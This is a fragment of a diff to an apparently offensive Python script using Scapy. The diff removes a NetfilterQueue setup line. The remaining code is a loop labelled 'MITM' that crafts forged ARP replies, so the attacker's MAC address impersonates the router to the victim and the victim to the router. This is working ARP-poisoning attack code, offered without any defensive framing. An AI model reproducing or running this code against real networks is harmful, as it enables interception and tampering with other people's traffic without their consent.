@@ -24,8 +24,6 @@ victim_MAC = MAC_on_network[1]
 routeur_IP = IP_on_network[2]
 routeur_MAC = MAC_on_network[2]
 
-queue = NetfilterQueue()
-
 while True: # MITM 
     spoof_arp_routeur = Ether(src=mac_of_atk)/ARP(op=2, pdst=routeur_IP, hwdst=routeur_MAC, psrc=victim_IP)
     spoof_arp_victim = Ether(src=mac_of_atk)/ARP(op=2, pdst=victim_IP, hwdst=victim_MAC, psrc=routeur_IP)
